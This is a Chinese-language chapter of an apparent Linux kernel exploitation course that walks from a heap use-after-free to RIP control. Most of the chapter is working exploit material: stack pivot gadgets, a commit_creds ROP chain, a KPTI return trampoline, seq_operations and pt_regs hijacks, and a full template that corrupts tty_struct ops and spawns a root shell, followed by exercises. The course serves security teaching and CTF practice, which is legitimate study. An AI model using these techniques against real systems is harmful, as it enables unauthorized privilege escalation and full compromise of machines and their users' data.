# Ch 12 — 從 heap 到 RIP 控制：tty_struct ops hijack、seq_operations、pt_regs

> 目標：把 Ch 9-11 的 heap 原語接到 RIP 控制 — 拿到 RIP 之後跳到哪、怎麼接 stack pivot、KPTI 出口怎麼接。這章寫完你會有第一個能跑的 heap exploit。

## 從「我覆蓋了 ops」到「我控制了 RIP」中間發生什麼

很多人 Ch 11 寫到 `*ops_ptr = &fake_ops` 就以為結束了。沒有。kernel call 你的 fake function pointer 時，整條 RIP→stack pivot→ROP→commit_creds→KPTI 出口都還沒做。這章把這些連起來。

時序：

```
user: ioctl(tty_fd, ...)
 ↓
kernel: tty_ioctl()
 ↓
       tty->ops->ioctl(...)    ← indirect call，RIP = 你的 fake_ops.ioctl
 ↓
你的 stage1：怎麼拿到 controlled stack（pivot）
 ↓
你的 ROP chain：commit_creds(prepare_kernel_cred(0))
 ↓
怎麼從 kernel 安全回 user：KPTI trampoline
 ↓
user 端：execve("/bin/sh")
```

每一步都有自己的坑。

## Step 1：第一個 gadget 寫什麼

你 ops hijack 後 kernel 第一次 call 的位置叫 **first gadget**。它的職責**不是**做事，是**換 stack**（stack pivot）。

為什麼要 pivot？因為 kernel 真正在跑的 stack 是 task 的 kernel stack（per-task，固定 16K 在 kernel space），你不能直接寫上面 — 你連那個位置都不知道，且 SMAP 開的話 user-space 的 buffer 也不能用。

但是你可以**讓 RSP 指到你已經寫好 ROP chain 的某塊 kernel memory**（例如你 spray 出來的 `user_key_payload`，內容你完全可控）。

### 經典 pivot gadget

```asm
push rax ; pop rsp ; ret
```

這在 user-space ROP 是套路。kernel 上同樣可用。

但 `rax` 是 ioctl 的回傳值通道，你進函式時**控制不到 rax**（kernel 會根據 fake ops 的呼叫慣例填 ABI 參數到 rdi/rsi/rdx/rcx）。

幸好 `tty_struct->ops->ioctl(tty, file, cmd, arg)` 進去時：
- `rdi` = `tty *`（你已知地址，因為你 spray 它）
- `rsi` = `file *`
- `rdx` = `cmd`（你控制 — `ioctl(fd, cmd, arg)` 的 cmd）
- `rcx` = `arg`（你控制）

**你能直接控制 `rdx` 和 `rcx`**。所以好用的 pivot gadget 是：

```asm
mov rsp, rdx ; ret      # 你 ioctl 的 cmd 放 fake_stack 地址
push rdx ; ret           # 同上
xchg rsp, rdx ; ret
```

或：

```asm
mov rsp, rcx ; ret      # 你 ioctl 的 arg 放 fake_stack 地址
```

這些 gadget 在 `vmlinux` 裡幾乎一定找得到。用 `ropper --search "mov rsp, rdx"`。

### 沒有 mov rsp,rdx 怎麼辦

退一步用 **add rsp** 系列做 partial pivot：先把 RSP 往 user buffer 方向挪一段，但這要先 SMAP 關。

更實用的 trick：`xchg eax, esp ; ret`（注意是 32-bit `eax`/`esp`） — 把 RSP 高 32 bit 砍掉變成低位地址。kernel 上很少能直接這樣用，但記得它存在。

## Step 2：fake stack 放哪

你的「假 stack」就是 ROP chain 本體。

通常用 **`user_key_payload`** spray：

```c
char fake_stack[N];
size_t i = 0;
fake_stack[i++] = pop_rdi_ret;
fake_stack[i++] = 0;                  /* prepare_kernel_cred(0) */
fake_stack[i++] = prepare_kernel_cred;
fake_stack[i++] = pop_rdi_ret;
fake_stack[i++] = 0xffffffffffffffff; /* 待 commit_creds 填 */
fake_stack[i++] = mov_rdi_rax_ret;    /* rax = cred → rdi */
fake_stack[i++] = commit_creds;
/* KPTI trampoline */
fake_stack[i++] = swapgs_restore_regs_and_return_to_usermode + offset;
fake_stack[i++] = 0; fake_stack[i++] = 0;  /* dummy r15, r14 */
...

key_serial_t k = add_key("user", "name", fake_stack, sizeof(fake_stack), KEY_SPEC_PROCESS_KEYRING);
/* 透過 keyctl_read 確認 alloc 在哪、地址怎麼算（leak） */
```

`user_key_payload` 把 fake_stack 完整放進 kmalloc-N，你之後想辦法 leak 那個 kernel 地址，當作 pivot 目的地。

### Leak fake_stack 地址

通常路徑：

1. UAF + msg_msg → 讀 dangling object 的 list_head 拿到鄰居物件 kernel address
2. 用 spray 順序推算自己的 user_key_payload 落在哪個 slab 偏移
3. 算出 fake_stack 的 kernel virtual address

或更直接：用同一個 UAF 對 user_key_payload header 做 partial overwrite，把它的 self pointer 搞出來（每個 spray object 都有自己的 leak 配方）。

## Step 3：ROP chain — commit_creds(prepare_kernel_cred(0))

最簡單的提權 chain（已在 Ch 5 介紹，這裡是 heap 場景的版本）：

```c
fake_stack[0] = pop_rdi_ret;
fake_stack[1] = 0;
fake_stack[2] = prepare_kernel_cred;     /* rax = new cred (root) */
fake_stack[3] = mov_rdi_rax_ret;         /* rdi = rax */
fake_stack[4] = commit_creds;            /* current->cred = root cred */
/* 接 KPTI 出口 */
```

**注意 prepare_kernel_cred 的 5.x 變化**：5.13+ 後 `prepare_kernel_cred(NULL)` 會回傳 `init_cred`（也是 root），但 6.2 起若傳 NULL 會被改寫，要傳 `init_task` 地址或用 `&init_cred` 直接覆寫。

新版 kernel 替代：直接寫 `current->cred = &init_cred`（需要任意寫原語，Ch 14 會更深入）。

### 最小 ROP gadget 表

| 用途 | gadget |
|---|---|
| stack pivot | `mov rsp, rdx ; ret` 或 `mov rsp, rcx ; ret` |
| pop arg | `pop rdi ; ret` / `pop rsi ; ret` |
| 搬資料 | `mov rdi, rax ; ret` 或 `mov rdi, rax ; pop rbp ; ret` |
| call function | 直接放 function symbol |
| 出口 | `swapgs_restore_regs_and_return_to_usermode` + 偏移 |

`ropper --file vmlinux --search "..."` 撈出來。`vmlinux` 沒有就用 `extract-vmlinux` 從 bzImage 解。

## Step 4：KPTI 出口（Ch 7 複習）

提權完成後直接 ret 會死 — kernel 嘗試從 kernel page table 回 user space 但 PCID/CR3 沒切。要走 `swapgs_restore_regs_and_return_to_usermode`。

`objdump -d vmlinux | grep swapgs_restore_regs` 找到入口。**真正要跳的不是入口本身**，而是中間那段：

```asm
; swapgs_restore_regs_and_return_to_usermode:
   pop r15
   pop r14
   pop r13
   pop r12
   pop rbp
   pop rbx
   pop r11        ← 你跳到這後面是 OK 的
   pop r10
   pop r9
   pop r8
   pop rax
   pop rcx
   pop rdx
   pop rsi
   pop rdi
   ; ...
   ; mov %rsp, %rdi
   ; mov %r12, ...
   ; (PTI page table swap)
   ; iretq        ← 真正回 user
```

跳到 `pop rax` 那行（從 `pop r11` 跳開的話省 6 個 pop）通常最穩。chain 長這樣：

```c
fake_stack[N+0] = swapgs_restore_regs + OFFSET;  /* 跳到 pop rax 之前 */
fake_stack[N+1] = 0;     /* rax dummy */
fake_stack[N+2] = 0;     /* rcx dummy */
fake_stack[N+3] = 0;     /* rdx */
fake_stack[N+4] = 0;     /* rsi */
fake_stack[N+5] = 0;     /* rdi */
fake_stack[N+6] = 0;     /* fake "error code" / rax2 */
fake_stack[N+7] = (uint64_t)user_shell;   /* RIP after iretq */
fake_stack[N+8] = USER_CS;
fake_stack[N+9] = USER_RFLAGS;
fake_stack[N+10] = (uint64_t)&user_stack[USER_STACK_SIZE-8];
fake_stack[N+11] = USER_SS;
```

`USER_CS`、`USER_SS`、`USER_RFLAGS` 在進 kernel 之前用 inline asm 存：

```c
uint64_t user_cs, user_ss, user_rflags, user_sp;
__asm__("movq %%cs, %0\n\t"
        "movq %%ss, %1\n\t"
        "pushfq\n\t"
        "popq %2\n\t"
        "movq %%rsp, %3\n\t"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp));
```

`user_shell` 是你 user space 的 `system("/bin/sh")` wrapper。

### 偏移找法

```sh
objdump -d vmlinux | grep -A 30 "swapgs_restore_regs_and_return_to_usermode>:"
```

數到 `pop rax` 那行的相對 offset。之後你在 fake_stack 裡放 `swapgs_restore_regs + 0x?` 是這個值。每個 kernel 不同，每次 build 重算。

## Step 5：避開常見死法

### 死法 A：double fault / GPF on iretq

`USER_CS / USER_SS` 抓錯（例如抓到 `__USER32_CS`）。x86_64 user 程式應該是 `0x33`（`__USER_CS | 3`）和 `0x2b`（`__USER_DS | 3`）。compiler 跑 64-bit 才會抓對。

### 死法 B：oops in commit_creds，kernel hang

`prepare_kernel_cred` 的 prototype 在 6.2 改了。你傳 0 它會 NULL deref。`prepare_kernel_cred(&init_task)` 是新版正確用法 — 但你要先 leak `&init_task`。

繞法：直接 data-only 寫 `current->cred->{uid,gid,euid,egid,fsuid,fsgid} = 0`（Ch 18 會講）。

### 死法 C：KPTI 沒走，回 user 時 crash

trampoline 跳的位置算錯、或你跳到入口而非中間那段。最快驗法：先把 trampoline 全段 `objdump` 列出來，數準確。

### 死法 D：第二個 ioctl 後 kernel panic

第一個 ioctl 拿到 root 後跳回 user 跑 shell，但 tty_struct 還在 corrupted 狀態。close(tty_fd) 的時候 kernel 會走 `ops->close`，又 call 一次 fake function → 二次崩潰。

修法：拿到 root 後**立刻 fork**，parent 收尾、child 開 shell。或者在 fake_ops 結構裡所有非 ioctl 的 entry 都填合法的 dummy（指向 `kernel_default_function` 之類）。

### 死法 E：CPU 不一致

你 spray 在 CPU 0 但 trigger 在 CPU 1，兩個 CPU 各自有 per-cpu freelist，spray 完全沒效果。

修法：`sched_setaffinity` pin 到固定 CPU，整個 exploit 都不換。

```c
cpu_set_t mask;
CPU_ZERO(&mask);
CPU_SET(0, &mask);
sched_setaffinity(0, sizeof(mask), &mask);
```

## seq_operations 版本（kmalloc-32）

當你的 UAF chunk 是 kmalloc-32（小 size），tty_struct（kmalloc-1024）幫不上。用 `seq_operations`：

```c
int spray_seq[256];
for (int i = 0; i < 256; i++)
    spray_seq[i] = open("/proc/self/stat", O_RDONLY);

/* trigger UAF write 把 seq_operations->start 蓋成 pivot gadget */

read(spray_seq[i], buf, 1);   /* kernel call seq_ops->start() → RIP */
```

注意：開 `/proc/self/stat` 的時候是 kernel alloc `seq_operations`，**內容是 hardcoded** struct。你不能 user-side 控制 — 你需要用 UAF 把它的 `start` 欄位覆寫掉。

`offset(seq_operations, start) = 0`，所以 UAF write 從第一個 byte 就是它。

## pt_regs 法（更精細的 RIP 控制）

進 syscall 時 kernel 會把 user 的所有暫存器存進 task 的 kernel stack，這個結構叫 `pt_regs`。位置在 task kernel stack 的最頂（`task_pt_regs(current)`）。

如果你能拿到任意寫並算出 `&pt_regs.ip`，**直接寫一個值進去**，syscall 返回時 iretq 用的 RIP 就是你的。

差異：不需要 ROP。直接「下次 syscall return 時 RIP 變成 X」。

實作：

```c
/* 你已經有任意寫原語 */
write_kernel(task_pt_regs_ip, target_rip);

/* 在另一個 thread 跑一個無辜 syscall 之類的東西 */
syscall(SYS_pause);
/* return 時 iretq 拿你寫的 ip */
```

要算出 `task_pt_regs(current)` 你得 leak `current` 的 kernel stack base，或透過 spray 物件的鄰居推算。實務上 Dirty Pagetable / USMA（Ch 14, 15）會把這個變得簡單。

## 完整模板（heap UAF → root shell）

```c
/* 略過 spray_msg/spray_key/leak/UAF write 的 helper */

void exploit(void) {
    save_user_regs();
    pin_cpu(0);
    setup_namespace();

    /* 階段 1：leak kernel base */
    int q = make_msg_q();
    spray_msg(q, 96, 32);                // 填 kmalloc-128
    create_uaf_object();                 // 你題目的 vuln 路徑
    free_uaf_object();
    msgrcv(q, leak_buf, 96, 0, MSG_COPY);  // 讀回 dangling chunk
    kernel_base = parse_leak(leak_buf) - SOME_OFFSET;
    fix_offsets(kernel_base);

    /* 階段 2：spray fake_stack via user_key_payload，leak 它 */
    build_fake_stack();
    key_serial_t k = add_key(..., fake_stack, sizeof(fake_stack), ...);
    fake_stack_kaddr = leak_user_key_payload_addr(k);

    /* 階段 3：spray tty_struct */
    int tty_fds[64];
    for (int i = 0; i < 64; i++) tty_fds[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);

    /* 階段 4：UAF write tty_struct->ops = &fake_ops */
    overwrite_tty_ops(victim_tty_index, fake_ops_kaddr);

    /* 階段 5：trigger，跳 pivot */
    ioctl(tty_fds[victim_tty_index],
          fake_stack_kaddr,    /* cmd → rdx，pivot 用 */
          0);

    /* 階段 6：拿到 root 之後 */
    if (getuid() == 0) {
        execlp("/bin/sh", "sh", NULL);
    }
}
```

## 動手練習

1. **找 5 個 stack pivot gadget**：在你 Ch 0 的 vmlinux 上 `ropper --search "mov rsp"`，列出 5 個能用的版本，標出輸入暫存器是哪個。
2. **手動數 KPTI trampoline 偏移**：`objdump -d vmlinux | grep -A 50 swapgs_restore_regs_and_return_to_usermode`，找到 `pop rax` 行，計算 `+OFFSET`。寫進 exploit。
3. **改 Ch 11 的 spray 模板，加 `pt_regs` 路徑**：spray 一些目標 task，找出 `task_pt_regs` 的位置，準備一個 helper `write_pt_regs_ip(task_addr, rip)`。
4. **故意把 USER_CS 寫錯**：跑 exploit，記錄 kernel oops 訊息（`dmesg`），看「general protection fault」長什麼樣。下次認得出。
5. **練 partial overwrite**：tty_struct->ops 在 .rodata 區，bytes 有規律。試著只覆寫 ops 的低 2 byte，把它指到 vmlinux 內的相鄰函式 — 練一次「不用全 leak kernel base 也能拿 RIP」的招。

## 自我檢核

- [ ] 能畫出 ioctl → fake_ops → pivot → ROP → KPTI 出口的完整流
- [ ] 知道為什麼第一個 gadget 是 stack pivot 而非 commit_creds
- [ ] 能默寫 `mov rsp, rdx ; ret` 和 `mov rsp, rcx ; ret` 各自的觸發 ABI（cmd / arg 對應）
- [ ] KPTI trampoline 跳到 `pop rax` 之前那段，知道為什麼不能跳入口
- [ ] 知道 `prepare_kernel_cred(0)` 在 6.2+ 為何不能用
- [ ] 知道兩個 ioctl 之後 close 會二次走 fake_ops、要怎麼避免
- [ ] 能解釋 `pt_regs` 法跟 ROP 法的差異與適用情境

下一章把 SLUB heap 的另一個維度打開：當你的 UAF chunk 在 `kmalloc-1024` 但 victim 在另一個 dedicated cache（例如 `cred_jar`、`pid`），你要怎麼跨 cache 配對。Cross-cache attack 是 2023+ kernelCTF 的主旋律。

→ [Ch 13 — Cross-Cache Attack：跨 kmalloc cache 打 dedicated slab](./13-cross-cache.md)
